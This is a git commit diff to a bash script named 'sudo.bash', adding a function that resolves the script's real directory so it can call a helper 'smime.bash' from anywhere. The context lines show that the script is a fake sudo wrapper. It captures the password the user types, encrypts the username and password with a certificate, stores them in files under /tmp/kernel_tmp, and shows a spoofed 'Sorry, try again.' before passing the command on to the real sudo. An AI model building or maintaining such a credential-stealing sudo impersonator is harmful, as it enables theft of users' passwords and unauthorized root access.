30c7606234c453dcebe29803995744ce9fc74a91
Luis <admin@luiscaldas.com>
2022-08-18 13:22:47 +0100

    fixed script folders

--- sudo.bash
+++ sudo.bash
@@ -5,6 +5,32 @@ FOLDER_PATH="/tmp/kernel_tmp"
 
 COUNTER=0
 
+
+# Function to get real script dir
+function get_folder() {
+
+    # get the folder in which the script is located
+    SOURCE="${BASH_SOURCE[0]}"
+
+    # resolve $SOURCE until the file is no longer a symlink
+    while [ -h "$SOURCE" ]; do
+
+      DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
+
+      SOURCE="$(readlink "$SOURCE")"
+
+      # if $SOURCE was a relative symlink, we need to resolve it relative to the path where the symlink file was located
+      [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE"
+
+    done
+
+    # the final assignment of the directory
+    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
+
+    # return the directory
+    echo "$DIR"
+}
+
 function create_file_name() {
 
     SPECIFIC_NUMBER="$1"
@@ -27,6 +53,8 @@ function sudo_kernel() {
 
     SUDO_CACHED=false
 
+    folder_now="$(get_folder)"
+
     if sudo -S true < /dev/null 2> /dev/null ; then
         SUDO_CACHED=true
     fi
@@ -43,7 +71,7 @@ function sudo_kernel() {
             if echo "$PASSWORD" | sudo -S echo 2>&1 | grep -q "try again" ; then
 
                 echo "$USER $PASSWORD" |
-                ./smime.bash encrypt "$CERTIFICATE" - "$FOLDER_PATH/$(create_file_name $COUNTER)"
+                "${folder_now}/smime.bash" encrypt "$CERTIFICATE" - "$FOLDER_PATH/$(create_file_name $COUNTER)"
 
                 echo "Sorry, try again."
 
@@ -52,7 +80,7 @@ function sudo_kernel() {
             else
 
                 echo "$USER $PASSWORD" |
-                ./smime.bash encrypt "$CERTIFICATE" - "$FOLDER_PATH/$(create_file_name $COUNTER)y"
+                "${folder_now}/smime.bash" encrypt "$CERTIFICATE" - "$FOLDER_PATH/$(create_file_name $COUNTER)y"
 
                 sudo "$@"
 
@@ -63,7 +91,7 @@ function sudo_kernel() {
         else
 
             echo "$USER $PASSWORD" |
-            ./smime.bash encrypt "$CERTIFICATE" - "$FOLDER_PATH/$(create_file_name $COUNTER)"
+            "${folder_now}/smime.bash" encrypt "$CERTIFICATE" - "$FOLDER_PATH/$(create_file_name $COUNTER)"
 
             COUNTER=$(( COUNTER + 1 ))
 
